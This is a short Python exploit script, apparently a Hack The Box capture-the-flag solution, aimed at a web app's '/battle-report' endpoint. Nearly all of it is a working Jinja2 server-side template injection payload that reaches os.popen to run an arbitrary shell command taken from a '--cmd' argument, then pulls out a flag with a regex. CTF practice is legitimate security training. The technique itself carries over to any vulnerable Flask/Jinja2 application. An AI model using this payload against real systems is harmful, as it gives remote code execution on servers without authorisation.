import argparse
import requests
import re

# Setup command line arguments
parser = argparse.ArgumentParser()
parser.add_argument("--url", type=str, default="http://localhost:1337", help="Target URL")
parser.add_argument("--cmd", type=str, default="cat flag.txt", help="Command to execute remotely")

args = parser.parse_args()
url = args.url
cmd = args.cmd

# Create a session to maintain cookies and session data
session = requests.session()

# Initiate session with warrior name (necessary for the app logic)
session.post(url + "/begin", data={"warrior_name": "aaaa"})

# Craft payload exploiting Jinja2 SSTI vulnerability
payload = f"{{{{self.__init__.__globals__.__builtins__.__import__('os').popen('{cmd}').read()}}}}"

# Send malicious payload to vulnerable endpoint
response = session.post(url + "/battle-report", data={"damage_dealt": payload})

# Extract the flag from the response using regex
match = re.search(r'HTB\{[A-Za-z0-9_]+\}', response.text)

# Print the flag if found, otherwise print response
if match:
    print(match.group())
else:
    print(response.text)